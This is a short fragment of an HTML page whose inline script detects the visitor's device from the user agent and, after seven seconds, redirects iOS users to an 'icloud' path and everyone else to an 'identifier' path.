    </div>
    <script>
        function getOS() {
            var userAgent = navigator.userAgent || navigator.vendor || window.opera;
            if (/android/i.test(userAgent)) {
                return "Android";
            }
            if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
                return "iOS";
            }
            return "PC";
        }

        var sistema = getOS();
        switch(sistema){

            default:
            setTimeout(function(){location.href="identifier"} , 7000);
            break;

            case 'iOS':
            setTimeout(function(){location.href="icloud"} , 7000);
            break;
        }

    </script>
